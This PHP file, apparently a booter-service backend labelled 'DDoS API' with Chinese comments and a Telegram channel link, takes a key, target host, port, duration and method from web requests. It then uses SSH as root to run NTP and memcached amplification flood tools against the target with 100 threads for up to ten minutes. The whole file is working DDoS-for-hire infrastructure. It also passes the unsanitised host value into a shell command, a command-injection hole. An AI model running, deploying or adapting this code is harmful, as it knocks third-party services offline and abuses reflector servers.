<?php
########################################################################################################################
# DDoS API - PHP
# TG: https://t.me/DDoS_DataStation
########################################################################################################################
# 初始化
error_reporting(E_ALL^E_NOTICE^E_WARNING);
ignore_user_abort(true);
set_time_limit(3000);

# 设置
$Set = array(
    # 程序目录
    'AppDir' => '/home/',

    # 线程
    'Thread' => 100,

    # 时间上限 (秒)
    'TimeLimit' => 600
);

# 服务器 SSH 信息
$Server = array(
    'Host' => '127.0.0.1',
    'Port' => 22,
    'UserName' => 'root',
    'Password' => ''
);

# 秘钥
$Keys = array(
    'key'
);

# 方法
$Methods = array(
    'ntp',
    'memc'
);
########################################################################################################################
# 接收传递参数 GET POST 通用
$Key = $_REQUEST['key'];
$Host = $_REQUEST['host'];
$Port = intval($_REQUEST['port']);
$Time = intval($_REQUEST['time']);
$Method = strtolower($_REQUEST['method']);
########################################################################################################################
# 验证
if (!function_exists("ssh2_connect")) die("错误：服务器未安装 PHP-SSH2 扩展");
if (empty($Key)) die("错误：接口秘钥(API Key) 为空");
if (!in_array($Key, $Keys) && $Set['AdminKey'] !== $Key) die("错误：接口秘钥(API Key) \"$Key\" 不存在");
if (empty($Host)) die("错误：主机(Host) 为空");
if (empty($Port)) die("错误：端口(Port) 为空");
if (empty($Time)) die("错误：时间(Time) 为空");
if (empty($Method)) die("错误：方法(Method) 为空");
if (!in_array($Method, $Methods)) die("错误：方法(Method) \"$Method\" 不存在");
if ($Port > 65535 || $Port < 0) die("错误：端口(Port) \"$Port\" 错误");
if ($Time > $Set['TimeLimit'] || $Time < 5) die("错误：时间(Time) 不能大于 ".$Set['TimeLimit']." 秒或小于 5 秒");
########################################################################################################################
# 命令
$Command = $Set['AppDir'].$Method.' '.$Host.' '.$Port.' '.$Set['AppDir'].$Method.'.txt '.$Set['Thread'].' -1 '.$Time;
########################################################################################################################
# SSH
if (!($conn = ssh2_connect($Server['Host'], (int)$Server['Port']))) die("错误：SSH 连接失败");
if (!ssh2_auth_password($conn, $Server['UserName'], $Server['Password'])) die("错误：SSH 用户名或密码错误");
if (($str = ssh2_exec($conn, $Command))) {
    stream_set_blocking($str, false);
    $data = "";
    while ($buf = fread($str,4096)) $data .= $buf;
    die('提交成功');
}
else die("错误：SSH 命令执行失败");
########################################################################################################################